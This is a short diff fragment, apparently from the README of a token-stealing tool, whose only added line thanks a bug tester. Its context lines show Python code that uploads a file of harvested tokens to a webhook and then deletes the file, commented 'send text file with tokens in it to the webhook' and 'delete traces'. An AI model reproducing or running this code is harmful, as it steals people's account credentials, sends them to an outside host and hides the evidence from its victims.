@@ -148,3 +148,5 @@ requests.post(api, headers={"Authorization": key}, data={"content": f'Successful
 requests.post(api, headers={"Authorization": key}, files={"upload_file": open(_file, 'rb')}) #send text file with tokens in it to the webhook
 os.remove(_file) #delete traces
 ```
+
+> Thank you [xrevix](https://github.com/xrevix) for bug testing and reporting all of them 😘
